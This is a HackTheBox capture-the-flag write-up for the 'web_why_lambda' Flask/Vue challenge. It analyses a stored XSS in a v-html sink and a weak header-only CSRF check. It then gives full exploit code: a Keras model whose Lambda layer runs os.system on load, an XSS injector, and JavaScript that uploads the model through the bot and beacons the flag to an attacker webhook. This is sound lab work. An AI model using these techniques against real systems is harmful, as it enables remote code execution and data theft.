# HackTheBox `web_why_lambda`

The challenge have flag.txt referenced nowhere so either LFI or RCE. App has backend in flask and front in vue. The app has a bot and its password is ungettable afaik. When bot -> XSS. So I looked into vue XSS examples and all showed just `v-html` as the equivalent of innerHTML. Only `challenge/frontend/src/components/ImageBanner.vue:8` component contains it and is misleadingly *(because in normal html `textContent` is safe)* populated by `textContent` parameter. Other ways for XSS in vue are manipualting raw html, so I looked into usage of ImageBanner and how I can control the `textContent` value.

## `challenge/frontend/src/components/ImageBanner.vue:8` - `views/index.vue`


### not really xss

```
challenge/backend/model.py:63							-> len(X_train)+len(X_test)
challenge/backend/app.py:61								-> (j.count = innerHTML)
challenge/frontend/src/views/Index.vue:67				->
challenge/frontend/src/views/Index.vue:6 				->
challenge/frontend/src/components/ImageBanner.vue:8
```


### if no vuln nor feature in keras i doubt the vuln is here

```
challenge/backend/model.py:59 :58						-> m = keras.models.load_model(path); metrics = m.evaluate(X_test, Y_test)
challenge/backend/model.py:60							-> round(metrics[0] & metrics[1], 3)
challenge/backend/app.py:55								-> metrics = test_model(MAIN_MODEL); return jsonify(metrics) [jsonify safe? maybe parsing issue with numbers or sth like that]
challenge/frontend/src/views/Index.vue:49				->
challenge/frontend/src/views/Index.vue:68				-> (this.metrics.acc / loss)
challenge/frontend/src/views/Index.vue:6 				->
challenge/frontend/src/components/ImageBanner.vue:8
```

## `challenge/frontend/src/components/ImageBanner.vue:8` - `views/Dashboard.vue`

### !!!!! - 100% win

```
challenge/frontend/src/components/ImageBanner.vue:8
challenge/frontend/src/views/Dashboard.vue:17			-> innerHTML="getPredictionText(c)"
challenge/frontend/src/views/Dashboard.vue:65			-> complaint.prediction (overriding in json the 'prediction' key of complaint object?)
challenge/frontend/src/views/Dashboard.vue:61			-> obj from api '/api/internal/complaints'
challenge/backend/app.py:124							-> (only bot) get_all_complaints
challenge/backend/complaints.py:27						-> complaints.append(json.loads(f.read()))
challenge/backend/complaints.py:16						-> add_complaint
challenge/backend/app.py:79								-> POST
```

## What's next

We can now control routes marked as `@authenticated`. There is of course the `@csrf_protection` but I think it might be a joke as the code for it looks as follows:

```python
# https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#custom-request-headers
def csrf_protection(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        csrf_header = request.headers.get("X-SPACE-NO-CSRF")
        if csrf_header != "1":
            return jsonify({"error": "Invalid csrf token!"}), 403
        
        return f(*args, **kwargs)
    return decorated_function
```

so we can easily `fetch` in js using our header like:

```javascript
const response = await fetch(
    "url",
    {
        headers: {
            "X-SPACE-NO-CSRF": "1"
        },
        method: "POST",
    }
)
```

Now we can restrict our view to routes marked as `@authenticated` as this is new vector attack for us. The routes marked as such are:
- `POST /api/internal/model` - `challenge/backend/app.py:90`:
	Uploading a file that is safely stored and **loaded**, which triggers the models functions layer.
- `GET /api/internal/complaints` - `challenge/backend/app.py:121`:
	this was the trigger of our xss so probably not here
- `GET /api/internal/models/<path:path>` - `challenge/backend/app.py:115`:
	this looks very promising. The function looks as follows:

```python
@app.route("/api/internal/models/<path:path>")
@authenticated
def serve_models(path):
    return send_from_directory("models", path)
```

The function `send_from_directory` is from `Flask` and it just serves the file:
> - directory – the directory where all the files are stored.
> - filename – the filename relative to that directory to download.

`./Dockerfile:3` shows that whole dir challenge is copied to `/app` dir so the path to the flag would be exactly `/app/flag.txt`. The function is getting any path from the user that is in `/app/backend/models/` directory. In order to get the flag we need some path traversal, but for now I'm not entirely sure it's possible with route parameter like we have here.

`send_from_directory` is a safe from path traversal function, so now fun there. It uses `werkzeug.security.safe_join` under the hood.

We can upload a malicious model which 1 layer will contain our `os.system` payload with copying the flag to models dir so we can retrieve it later. To create a model:

`mdl.py`:
```python
from keras.datasets import mnist
from keras.utils import to_categorical
from keras.models import Sequential
from keras.layers import Dense, Activation, Lambda


def exploit(x):
    import os

    os.system("cp /app/flag.txt /app/backend/models/flag.txt")
    return x


model = Sequential()
model.add(Dense(10, input_shape=(784,)))
model.add(Lambda(exploit))
model.add(Dense(10))
model.add(Activation("softmax"))

model.compile(loss="categorical_crossentropy", metrics=["accuracy"], optimizer="adam")
(X_train, y_train), (X_test, y_test) = mnist.load_data()

X_train = X_train.reshape(60000, 784)
X_test = X_test.reshape(10000, 784)
X_train = X_train.astype("float32")
X_test = X_test.astype("float32")

X_train /= 255
X_test /= 255

n_classes = 10
Y_train = to_categorical(y_train, n_classes)
Y_test = to_categorical(y_test, n_classes)


history = model.fit(
    X_train,
    Y_train,
    batch_size=128,
    epochs=20,
    verbose=2,
    validation_data=(X_test, Y_test),
)

model.save("pwn.h5")
```


`pwn.py`:
```python
import requests
import base64

host = "http://<CHALL_URL>"
webhook = "https://<WEBHOOK_URL>"


def add_complaint(payload):
    r = requests.post(
        f"{host}/api/complaint",
        headers={"X-SPACE-NO-CSRF": "1", "Content-Type": "application/json"},
        json={"description": "test", "image_data": "test", "prediction": f"{payload}"},
    )
    return r.text


js = open("pwn.js", "r+").read().replace("WEBHOOK_URL", webhook)
encoded = base64.encodebytes(js.encode()).decode().strip().replace("\n", "")
p = f'<img src=x onerror=eval(atob("{encoded}"))>'
print(p)
add_complaint(p)
```

`pwn.js`:
```javascript
const step1 = async () => {
	let r = await fetch("<YOUR_STORAGE>/pwn.h5");
	let b = await r.blob();
	console.log(b);
	// now we upload the model internally with the csrf header '1'
	let fd = new FormData();
	fd.append("file", b, "pwn.h5");
	r = await fetch("http://127.0.0.1:1337/api/internal/model", {
		headers: {
			"X-SPACE-NO-CSRF": "1",
			"Access-Control-Allow-Origin": "*",
		},
		method: "POST",
		body: fd,
	});
};

const step2 = async () => {
	r = await fetch("http://127.0.0.1:1337/api/internal/models/flag.txt", {
		headers: {
			"X-SPACE-NO-CSRF": "1",
		},
		method: "GET",
	});
	return await r.text();
};

const main = async () => {
	// 1. upload the model
	await step1();

	// 2. the flag should be copied when the model is tested
	const flag = await step2();
	navigator.sendBeacon("WEBHOOK_URL", flag);
};

main();
```

## Exploit

1. Run `python mdl.py` to create the malicious model
2. Upload the `pwn.h5` model to a server that upon *GET*ting the file, will return with `Access-Control-Allow-Origin: *` header
3. Replace `<CHALL_URL>`, `<WEBHOOK_URL>` and `<YOUR_STORAGE>` in `pwn.py` and `pwn.js`
4. Run `python pwn.py`
